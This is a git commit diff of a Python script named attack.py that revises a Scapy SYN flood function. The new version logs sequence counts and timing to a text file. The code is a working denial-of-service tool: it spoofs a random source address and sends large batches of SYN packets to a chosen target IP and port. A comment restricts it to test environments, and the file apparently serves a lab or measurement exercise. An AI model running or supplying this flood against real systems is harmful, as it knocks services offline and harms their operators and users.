8036db035ea84870558eb83d80194c2f7476bf28
YakirLitmanovitch <yakirli45@gmail.com>
2025-04-06 19:27:08 +0300

    Update attack.py

--- attack.py
+++ attack.py
@@ -5,34 +5,29 @@ import time
 from scapy.layers.inet import IP, TCP
 
 
-def syn_flood(target_ip, target_port, packets_per_batch=10000, batches=100):
-    total_packets_sent = 0
-    src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
-    src_port = random.randint(1024, 65535)
-    ip = IP(src=src_ip, dst=target_ip)
-    tcp = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 100000))
-    start_time = time.time()
-    for batch in range(batches):
-        print(f"\n[Batch {batch + 1}/{batches}] Sending {packets_per_batch} SYN packets...")
-
+def syn_flood(target_ip, target_port, packets_per_batch=10000, batches=100, log_file = "syns_results_p.txt"):
+    with open(log_file, "a") as log:
+        log.write(f"\n\n--- SYN Flood Simulation Started at {time.time()} ---\n")
+        total_packets_sent = 0
+        src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
+        src_port = random.randint(1024, 65535)
+        ip = IP(src=src_ip, dst=target_ip)
+        tcp = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 100000))
         start_time = time.time()
+        for batch in range(batches):
+            print(f"\n[Batch {batch + 1}/{batches}] Sending {packets_per_batch} SYN packets...")
+            for _ in range(packets_per_batch):
+                send(ip/tcp, verbose=False)
+                total_packets_sent += 1
+                #txt.(total_packets_sent, time.time()-start_time \n)
+                log.write(f" SEQ = {total_packets_sent} TTL[{time.time()-start_time}] \n")
 
-        for _ in range(packets_per_batch):
-            send(ip/tcp, verbose=False)
-            total_packets_sent += 1
-
-
-
-
-        #total_packets_sent += packets_per_batch
-
-        #print(f"Batch duration: {batch_duration:.4f} seconds")
-        #print(f"Average time per packet: {avg_time_per_packet:.6f} seconds")
-    end_time = time.time()
-    batch_duration = end_time - start_time
-    avg_time_per_packet = batch_duration / packets_per_batch
-    print(f"\n--- SYN flood simulation complete ---")
-    print(f"Total packets sent: {total_packets_sent}")
+        end_time = time.time()
+        total_time = end_time - start_time
+        avg_time_per_packet = total_time / total_packets_sent
+        log.write(f"\n--- SYN flood simulation complete ---\n")
+        log.write(f"Total Time = {total_time}\n Avg Time = {avg_time_per_packet}\n")
+        log.write(f"Total packets sent: {total_packets_sent}")
 
 # Example usage (USE ON TEST ENVIRONMENT ONLY)
 # syn_flood("192.168.1.100", 80)
